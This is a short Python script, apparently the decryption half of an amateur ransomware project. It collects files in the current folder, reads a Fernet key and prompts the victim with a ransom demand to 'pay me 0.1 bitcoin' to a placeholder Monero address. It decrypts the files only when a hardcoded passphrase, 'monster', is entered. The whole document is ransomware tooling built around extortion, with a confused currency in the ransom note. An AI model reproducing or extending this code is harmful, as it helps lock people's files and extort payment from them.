import os
from cryptography.fernet import Fernet
#Trouver des fichier

files = []

for file in os.listdir():
    if file == "malware.py" or file == "thekey.key" or file == "decrypted.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
with open ("thekey.key", "rb") as key:
    secretkey =key.read()

secret_phrase = "monster"
user_phrase = input ("Enter a secret phrases to decrypt the files after you pay me 0.1 bitcoin at this adress 'ENTER YOUR MONERO ADRESS' ")
if secret_phrase == user_phrase :
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("congrats youre files are decrypted")
else:
        print("No still encrypted")

